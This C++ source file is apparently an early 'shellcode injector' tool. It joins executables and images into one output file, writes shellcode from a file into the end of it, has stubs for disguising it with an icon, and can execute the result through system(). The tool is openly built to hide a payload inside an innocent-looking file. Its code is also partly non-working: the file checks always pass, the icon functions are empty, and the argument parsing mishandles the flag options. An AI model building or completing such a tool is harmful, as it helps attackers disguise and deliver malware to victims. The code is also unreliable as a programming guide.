#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstdint>
#include <cstdlib>

#ifdef _WIN32
#include <windows.h>
#endif

const std::string version = "0.0.0.2";

void displayHelp() {
    std::cout << R"(
 /$$$$$$$$ /$$                 /$$$$$$$  /$$    /$$$$$$$$ /$$ /$$   /$$                           /$$                        
|__  $$__/| $$                | $$__  $$| $$   |__  $$__/|__/| $$$ | $$                          | $$                        
   | $$   | $$$$$$$   /$$$$$$ | $$  \ $$| $$$$$$$ | $$    /$$| $$$$| $$ /$$  /$$$$$$   /$$$$$$$ /$$$$$$    /$$$$$$   /$$$$$$ 
   | $$   | $$__  $$ /$$__  $$| $$$$$$$ | $$__  $$| $$   | $$| $$ $$ $$|__/ /$$__  $$ /$$_____/|_  $$_/   /$$__  $$ /$$__  $$
   | $$   | $$  \ $$| $$$$$$$$| $$__  $$| $$  \ $$| $$   | $$| $$  $$$$ /$$| $$$$$$$$| $$        | $$    | $$  \ $$| $$  \__/
   | $$   | $$  | $$| $$_____/| $$  \ $$| $$  | $$| $$   | $$| $$\  $$$| $$| $$_____/| $$        | $$ /$$| $$  | $$| $$      
   | $$   | $$  | $$|  $$$$$$$| $$$$$$$/| $$  | $$| $$   | $$| $$ \  $$| $$|  $$$$$$$|  $$$$$$$  |  $$$$/|  $$$$$$/| $$      
   |__/   |__/  |__/ \_______/|_______/ |__/  |__/|__/   |__/|__/  \__/| $$ \_______/ \_______/   \___/   \______/ |__/      
                                                                  /$$  | $$                                                  
                                                                 |  $$$$$$/                                                  
                                                                  \______/                                                   
)" << std::endl;
    std::cout << "Use: program -o <output_file> [-b <binary>] [-i <image>] [-c <icon>] [-r] [-x] -s <shellcode> [-e]" << std::endl;
    std::cout << "  -o <output_file>   Specifies the name of the output file." << std::endl;
    std::cout << "  -b <binary>        Specifies a binary file to be concatenated." << std::endl;
    std::cout << "  -i <image>         Specifies an image to be concatenated." << std::endl;
    std::cout << "  -c <icon>          Specifies a .ico icon file to be added to the executable." << std::endl;
    std::cout << "  -s <shellcode>     Specifies the file containing the shellcode to be injected." << std::endl;
    std::cout << "  -r                 Restores the image to its original state after injection." << std::endl;
    std::cout << "  -x                 Skips shellcode injection." << std::endl;
    std::cout << "  -e                 Executes the file after concatenation." << std::endl;
    std::cout << "  -h                 Displays help message." << std::endl;
    std::cout << "  -v                 Displays version information." << std::endl;
}

void displayVersion() {
    std::cout << "Version: " << version << std::endl;
}

void concatenateFiles(const std::string& outputFile, const std::vector<std::string>& files) {
    std::ofstream output(outputFile, std::ios::binary);
    if (!output) {
        std::cerr << "Error opening output file: " << outputFile << std::endl;
        return;
    }

    for (const auto& file : files) {
        std::ifstream input(file, std::ios::binary);
        if (!input) {
            std::cerr << "Error opening input file: " << file << std::endl;
            return;
        }
        output << input.rdbuf();
    }

    std::cout << "Successfully concatenated files into " << outputFile << std::endl;
}

bool isExecutable(const std::string& filename) {
    // Logic to check if it's an executable
    return true; 
}

bool isImage(const std::string& filename) {
    // Logic to check if it's an image
    return true; 
}

bool isIcon(const std::string& filename) {
    // Check if the file has a .ico extension
    return filename.size() > 4 && filename.substr(filename.size() - 4) == ".ico";
}

void injectShellcode(const std::string& imageFile, const std::string& shellcodeFile, bool restoreImage) {
    std::ifstream shellcodeInput(shellcodeFile, std::ios::binary | std::ios::ate);
    if (!shellcodeInput) {
        std::cerr << "Error opening shellcode file: " << shellcodeFile << std::endl;
        return;
    }

    std::ifstream imageInput(imageFile, std::ios::binary | std::ios::ate);
    if (!imageInput) {
        std::cerr << "Error opening image file: " << imageFile << std::endl;
        return;
    }

    // Get the size of the shellcode and image file
    std::streamsize shellcodeSize = shellcodeInput.tellg();
    std::streamsize imageSize = imageInput.tellg();
    imageInput.seekg(0, std::ios::beg);
    shellcodeInput.seekg(0, std::ios::beg);

    // Check if the shellcode size is larger than the image size
    if (shellcodeSize > imageSize) {
        std::cerr << "Shellcode size exceeds image size. Cannot inject shellcode." << std::endl;
        return;
    }

    // Find a suitable location for shellcode injection (e.g., at the end of the image)
    std::streampos injectionPoint = imageSize - shellcodeSize;

    // Create a buffer to store the image file content
    std::vector<char> imageBuffer(imageSize);

    // Read the image file content into the buffer
    if (!imageInput.read(imageBuffer.data(), imageSize)) {
        std::cerr << "Error reading image file." << std::endl;
        return;
    }

    // Create a copy of the original image for later restoration
    std::vector<char> originalImageBuffer = imageBuffer;

    // Read the shellcode content into a buffer
    std::vector<char> shellcodeBuffer(shellcodeSize);
    if (!shellcodeInput.read(shellcodeBuffer.data(), shellcodeSize)) {
        std::cerr << "Error reading shellcode." << std::endl;
        return;
    }

    // Inject the shellcode into the image buffer
    std::copy(shellcodeBuffer.begin(), shellcodeBuffer.end(), imageBuffer.begin() + injectionPoint);

    // Write the modified buffer back to the image file
    std::ofstream imageOutput(imageFile, std::ios::binary);
    if (!imageOutput.write(imageBuffer.data(), imageSize)) {
        std::cerr << "Error writing image file." << std::endl;
        return;
    }

    std::cout << "Shellcode successfully injected into the image." << std::endl;

    if (restoreImage) {
        // Restore the original image
        imageOutput.seekp(0);
        if (!imageOutput.write(originalImageBuffer.data(), imageSize)) {
            std::cerr << "Error restoring the original image." << std::endl;
            return;
        }

        std::cout << "Image restored to its original state." << std::endl;
    }
}

#ifdef _WIN32
void addIconToExecutable(const std::string& executable, const std::string& icon) {
    // Implementation for adding icon on Windows
}
#endif

#ifdef __linux__
void addIconToExecutable(const std::string& executable, const std::string& icon) {
    // Implementation for adding icon on Linux
}
#endif

#ifdef __APPLE__
void addIconToExecutable(const std::string& executable, const std::string& icon) {
    // Implementation for adding icon on macOS
}
#endif

void executeFile(const std::string& filename) {
    std::string command;

#ifdef _WIN32
    command = filename; // No need for "./" prefix on Windows
#else
    command = "./" + filename; // Unix-based systems
#endif

    int result = system(command.c_str());

    if (result != 0) {
        std::cerr << "Error running the executable." << std::endl;
    }
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cerr << "Use: " << argv[0] << " -h to display the help message." << std::endl;
        return 1;
    }

    std::vector<std::string> binaries;
    std::vector<std::string> images;
    std::string outputFile;
    std::string shellcodeFile;
    std::string iconFile;
    bool restoreImage = false;
    bool runExecutable = false;
    bool injectShellcodeFlag = true;

    for (int i = 1; i < argc; i += 2) {
        std::string option = argv[i];

        if (option == "-h") {
            displayHelp();
            return 0;
        } else if (option == "-v") {
            displayVersion();
            return 0;
        } else if (i + 1 >= argc) {
            std::cerr << "Option " << option << " requires an argument." << std::endl;
            return 1;
        }

        std::string filename = argv[i + 1];

        if (option == "-o") {
            outputFile = filename;
        } else if (option == "-b") {
            binaries.push_back(filename);
        } else if (option == "-i") {
            images.push_back(filename);
        } else if (option == "-s") {
            shellcodeFile = filename;
        } else if (option == "-c") {
            iconFile = filename;
        } else if (option == "-r") {
            restoreImage = true;
        } else if (option == "-x") {
            injectShellcodeFlag = false;
        } else if (option == "-e") {
            runExecutable = true;
        } else {
            std::cerr << "Invalid Option: " << option << std::endl;
            return 1;
        }
    }

    if (binaries.empty() && images.empty()) {
        std::cerr << "You need to specify at least one binary file or image to concatenate." << std::endl;
        return 1;
    }

    std::vector<std::string> filesToConcatenate;

    for (const auto& binary : binaries) {
        if (isExecutable(binary)) {
            filesToConcatenate.push_back(binary);
        } else {
            std::cerr << "The file " << binary << " is not a valid binary file." << std::endl;
            return 1;
        }
    }

    for (const auto& image : images) {
        if (isImage(image)) {
            filesToConcatenate.push_back(image);
        } else {
            std::cerr << "The file " << image << " is not a valid image." << std::endl;
            return 1;
        }
    }

    concatenateFiles(outputFile, filesToConcatenate);

    if (injectShellcodeFlag) {
        // Inject the shellcode into the image
        injectShellcode(outputFile, shellcodeFile, restoreImage);
    }

    // Add icon to the executable
    if (!iconFile.empty()) {
        if (isIcon(iconFile)) {
            addIconToExecutable(outputFile, iconFile);
        } else {
            std::cerr << "The file " << iconFile << " is not a valid .ico file." << std::endl;
            return 1;
        }
    }

    if (runExecutable) {
        executeFile(outputFile);
    }

    return 0;
}
